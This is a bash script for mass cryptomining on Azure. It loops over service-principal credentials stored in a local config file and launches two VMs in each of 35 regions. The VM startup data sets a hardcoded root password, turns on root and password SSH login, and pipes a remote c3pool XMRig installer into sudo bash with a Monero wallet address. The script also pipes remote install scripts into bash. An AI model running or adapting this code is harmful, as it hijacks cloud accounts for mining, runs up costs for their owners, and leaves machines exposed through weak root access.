#!/usr/bin/env bash

ins () {
    # install extra deps
    apt update -y &>/dev/null || yum makecache fast &>/dev/null || dnf makecache fast &>/dev/null;
    apt install -y -q $1 &>/dev/null || yum install -q -y $1 || dnf install -q -y $1;
}

ins_oci () {
    # install python3 when python3 command not found
	if ! [ -x "$(command -v python3)" ]; then
    bash -c "$(curl -L https://raw.githubusercontent.com/gcp5678/smithmlo/main/py.sh)" ;	  
    fi
    # install az cli when oci command not found
    curl -L https://aka.ms/InstallAzureCli | bash
    export PATH=$PATH:/root/bin;
    . $HOME/.bashrc;
}

# define strange variables
cmd_file="mlb.sh"

# custom script
cat << eof > "${cmd_file}"
#!/bin/bash
echo root:wh125125 |sudo chpasswd;
sudo sed -i 's/^.*PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config;
sudo sed -i 's/^.*PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config;
sudo service sshd restart;
curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 sudo bash -s 46MVgvFXbVZNvpAKrQPSWgevqqANgadFGTq2ocvZ5SjkT7vmLdLyKJ5eUgZrstVLExM8Q9ZsPyuRECfTDEmf2EwVDTBfdpZ
eof


# 初始化区域列表，共35个区域
locations=(
 eastus
 eastus2
 southcentralus
 westus2
 westus3
 australiaeast
 southeastasia
 northeurope
 swedencentral
 uksouth  
 westeurope
 centralus
 southafricanorth
 centralindia
 eastasia
 japaneast
 koreacentral
 canadacentral
 francecentral
 germanywestcentral
 norwayeast
 brazilsouth
 northcentralus
 westus
 switzerlandnorth
 uaenorth
 westcentralus
 australiacentral
 australiasoutheast
 japanwest
 koreasouth  
 southindia
 westindia
 canadaeast
 ukwest
)

check_env () {
    # do some prepare
    command -v az &>/dev/null || ins_oci;
    command -v jq &>/dev/null || ins jq;
  }

exec_launch () {
    for i in $(seq 0 ${#locations[@]})
    do
    location=${locations[$i]}
	echo -e $location
	az group create --name $location --location $location &>/dev/null || continue;
	az group create --name $location"2" --location $location &>/dev/null || continue;
	az vm create --resource-group $location --name "AZ-"$time"-"$name  --image UbuntuLTS --size Standard_D4s_v4 --public-ip-sku Standard --location $location --admin-username smithao --admin-password WangHao125125 --custom-data mlb.sh --no-wait &>/dev/null || continue;
    az vm create --resource-group $location"2" --name "AZ-"$time"-"$name  --image UbuntuLTS --size Standard_D4as_v4 --public-ip-sku Standard --location $location --admin-username smithao --admin-password WangHao125125 --custom-data mlb.sh --no-wait &>/dev/null || continue;
    done
}

exec_destroy () {
    for i in $(seq 0 ${#locations[@]})
    do
    location=${locations[$i]}
	az group delete --name $location --yes --no-wait &>/dev/null || continue;
	az group delete --name $location"2" --yes --no-wait &>/dev/null || continue;
	done
}

lmain () {
    check_env; 
    jq -c '.data[]' /root/.az/config.json | while read i; do
    appId=$(echo $i | jq .appId | tr -d '"' | tr -d '[]')
    password=$(echo $i | jq .password | tr -d '"' | tr -d '[]')
	tenant=$(echo $i | jq .tenant | tr -d '"' | tr -d '[]')
	az login --service-principal -u $appId -p $password --tenant $tenant
	name=`echo ${appId%%-*}`
	time=$(TZ=UTC-8 date "+%Y%m%d-%H%M")
	exec_launch;
	az vm list --query [*].location
    done   
}

[ "$1" == "destroy" ] && exec_destroy || lmain;
